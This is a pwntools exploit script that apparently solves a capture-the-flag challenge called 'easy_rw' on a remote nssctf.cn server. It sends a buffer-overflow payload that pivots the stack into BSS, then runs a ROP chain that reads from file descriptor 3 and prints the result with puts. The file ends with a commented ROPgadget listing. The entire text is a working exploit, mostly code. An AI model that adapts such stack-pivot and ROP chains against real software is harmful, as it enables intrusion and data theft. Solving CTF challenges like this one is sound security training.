from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28167)
# io=process("./easy_rw")
elf=ELF("./easy_rw")

bss_addr=0x404900
leave_ret=0x40126f
pop_rdi=0x4013c3
pop_rsi_r15=0x4013c1
read_sys=0x401349

# gdb.attach(io)
# pause()

io.recvuntil(b">> ")
payload=cyclic(0x40)+p64(bss_addr-0x8)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(read_sys)
io.send(payload)

#read
rw=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(bss_addr+0x200)+p64(0)+p64(elf.sym[b"read"])
#puts
rw+=p64(pop_rdi)+p64(bss_addr+0x200)+p64(elf.sym[b"puts"])

payload=rw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040126f : leave ; ret
# 0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013c0 : pop r14 ; pop r15 ; ret
# 0x00000000004013c2 : pop r15 ; ret
# 0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004011dd : pop rbp ; ret
# 0x00000000004013c3 : pop rdi ; ret
# 0x00000000004013c1 : pop rsi ; pop r15 ; ret
# 0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040124b : ret 0x2be

# Unique gadgets found: 13
